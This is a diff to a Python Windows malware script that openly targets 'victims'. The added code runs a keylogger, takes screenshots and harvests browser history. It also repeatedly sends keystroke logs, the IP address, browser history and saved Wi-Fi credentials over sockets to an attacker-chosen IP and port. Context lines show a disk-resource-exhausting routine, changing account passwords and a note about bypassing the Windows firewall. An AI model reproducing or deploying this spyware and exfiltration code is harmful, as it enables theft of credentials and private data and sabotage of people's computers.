@@ -3,10 +3,19 @@ import sys # identifying the system-specific parameters and functions
 import ctypes #ctypes for wallpaper changes
 import time #time can be used for delays and cycle changes
 import shutil #copying files
-import socket #Starting up a webserver
+import socket #transfer files via sockets
 import urllib.request #Downloading files from web
-from win32com import adsi #for setting password
+import pathlib
 import subprocess
+import json
+import sqlite3
+import win32crypt
+import broswerhistory as bh
+from win32com import adsi #for setting password
+from PIL import ImageGrab
+from PIL import Image 
+from multiprocessing import Process
+
 
 
 #GLOBAL VARIABLES
@@ -56,10 +65,79 @@ def dir_create():
 #spins up a server on port 80
 #windows firewall catches this action, which we need to bypass
 def run_server():
-    from http.server import HTTPServer, CGIHTTPRequestHandler
-    os.chdir('.')
-    server_object = HTTPServer(server_address=('0.0.0.0', 80), RequestHandlerClass=CGIHTTPRequestHandler)
-    server_object.serve_forever()
+    print('server_running')
+    IP = 'Type your IP address to retrieve information from victims'
+    PORT = "Choose desired Port"
+    ADDR = (IP,PORT)
+    Format = "utf-8"
+    SIZE = 1000000
+
+    while True:
+       
+        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client.connect(ADDR)
+
+        file = open("C:\\WindowsLogs\\keylogs.txt", "r")
+        data = file.read()
+
+        client.send("keylogs.txt".encode(Format))
+        msg = client.recv(SIZE).decode(Format)
+        #print(f"server: {msg}")
+
+        client.send(data.encode(Format))
+        file.close()
+        client.close()
+    #________________________________________________IP txt NEXT
+
+        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client.connect(ADDR)
+
+        file = open("C:\\WindowsLogs\\Ip_address.txt","r")
+        data = file.read()
+
+        client.send("Ip_address.txt".encode(Format))
+        msg = client.recv(SIZE).decode(Format)
+        print(f"server: {msg}")
+
+        client.send(data.encode(Format))
+        file.close()
+       
+        client.close()
+
+    #________________________________________________Browser History
+
+        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client.connect(ADDR)
+
+        file = open("C:\\WindowsLogs\\browser.txt","r")
+        data = file.read()
+
+        client.send("browser.txt".encode(Format))
+        msg = client.recv(SIZE).decode(Format)
+        print(f"server: {msg}")
+
+        client.send(data.encode(Format))
+        file.close()
+       
+        client.close()
+       
+
+    #_______________________________________________WIFI CREDS
+        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client.connect(ADDR)
+
+        file = open("C:\\WindowsLogs\\Wifi.txt","r")
+        data = file.read()
+
+        client.send("Wifi.txt".encode(Format))
+        msg = client.recv(SIZE).decode(Format)
+        print(f"server: {msg}")
+
+        client.send(data.encode(Format))
+        file.close()
+       
+        client.close()
+        time.sleep(15)
     
 #grabs credentials of any connected wifi networks
 def wifi_creds():
@@ -75,9 +153,14 @@ def wifi_creds():
             print ("{:<30}|  {:<}".format(i, ""),file=f)
     f.close()
     
-def winTimeSet():
-    os.system("date"+str(4-20-2020))
-    os.system("time"+str(6-6-6-66))
+def Browser_history(file_path):
+    browser_history = []
+    bh_user = bh.get_username()
+    db_path = bh.get_database_paths()
+    hist = bh.get_browserhistory()
+    browser_history.extend((bh_user, db_path, hist))
+    with open(file_path + 'browser.txt', 'a') as browser_txt:
+        browser_txt.write(json.dumps(browser_history))
     
 #Key logger to see all of the user keyboard inputs
 def key_logger():
@@ -92,6 +175,16 @@ def key_logger():
     with Listener(on_press=on_press) as listener:
         listener.join()
     f.close()
+  
+def screencaptures(file_path):
+    pathlib.Path('C:/WindowsLogs/Screenshots').mkdir(parents=True, exist_ok=True)
+    screen_path = file_path + 'ScreenShots\\'
+    
+    for x in range(0,5):
+        print("screen Captures")
+        pic = ImageGrab.grab()
+        pic.save(screen_path + 'screenshot{}.png'.format(x))
+        time.sleep(2)
     
 def set_password(username, password):
     from win32com import adsi
@@ -117,16 +210,19 @@ def disk_slammer():
 
 def main():
     from multiprocessing import Process
-    multiprocessing.freeze_support()
-    p1 = Process(target = run_server)
-    print("server running")
+    multiprocessing.freeze_support() #When testing python script alone comment this out.
+    
+    p1 = Process(target = key_logger)
+    print("Key Logger Running")
     p1.start()
-    p2 = Process(target = key_logger)
-    print("logger running")
+    
+    p2 = Process(target = run_server)
+    print("Server Running")
     p2.start()
-    p5 = Process(target = disk_slammer)
-    p5.start()
-    print("Slamming disk resources")
+    
+    p3 = Process(target = disk_slammer)
+    p3.start()
+    print("Slamming Disk Resources")
     
     dir_create()
     print("Directory successfully created")
@@ -134,6 +230,8 @@ def main():
     print("Wallpaper successfully applied")
     ip_address()
     copy_folder("C:/WindowsLogs/","C:/test/")
+    pathlib.Path('C:/WindowsLogs').mkdir(parents=True, exist_ok=True)
+    Browser_history(file_path)
      try: 
         win32serviceutil.QueryServiceStatus('WlanSvc')
     except:
